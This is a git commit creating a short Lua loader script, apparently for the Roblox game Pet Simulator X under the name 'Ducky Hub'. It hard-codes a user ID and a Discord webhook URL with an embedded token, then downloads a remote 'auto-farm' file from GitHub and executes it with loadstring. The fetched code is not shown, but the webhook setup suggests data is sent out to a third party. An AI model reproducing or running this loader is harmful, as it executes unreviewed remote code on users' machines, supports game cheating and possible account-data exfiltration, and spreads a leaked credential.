2fc43d641f51fdf920a4e78e26ab39eef6b598fd
blueyyot <121804083+blueyyot@users.noreply.github.com>
2023-01-08 13:15:28 +0000

    Create petsimx.lua

---
+++ petsimx.lua
@@ -0,0 +1,4 @@
+_G.UserID = 456922876 
+_G.WebHook = "https://discord.com/api/webhooks/1061633299224727692/B6XysQN90AsOXEQ6c1unOsmk_6P4Tw8vASo4AZxuw53bW3VFhsa4F5VuTv6Le3rkRs9A"
+_G.LoadingScreenText = "Ducky Hub"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
